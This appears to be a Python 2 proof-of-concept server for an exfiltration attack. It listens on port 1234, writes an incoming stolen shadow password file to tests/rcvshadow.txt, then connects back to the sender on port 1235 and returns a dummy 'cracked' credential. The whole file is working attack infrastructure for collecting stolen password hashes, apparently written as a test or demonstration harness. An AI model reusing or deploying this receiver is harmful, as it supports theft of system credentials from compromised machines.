import os, socket, time

HOST = ''
# Port to receive exfiltrated file
KEYRECEIVEPORT = 1234
# Port to re-send exfiltrated file
KEYSENDPORT = 1235

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, KEYRECEIVEPORT))
s.listen(1)
conn, addr = s.accept()

# Check if upload command
data = conn.recv(1)
print "GOT Connection from " + str(addr[0]) + ". Storing shadow file."
if data == "1":
    with open("tests/rcvshadow.txt", 'w+') as f:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            f.write(data)

        conn.close()

# Re-send "cracked" file (PoC)
time.sleep(3)
sent = False
print "Sending data to " + str(addr[0])
while not sent:
    try:
        s = socket.socket()
        s.connect((addr[0], KEYSENDPORT))
        s.sendall("recvshadw")
        time.sleep(1)
        s.sendall("user:password")
        s.close()
        sent = True
    except:
        s.close()
        time.sleep(1)
        continue
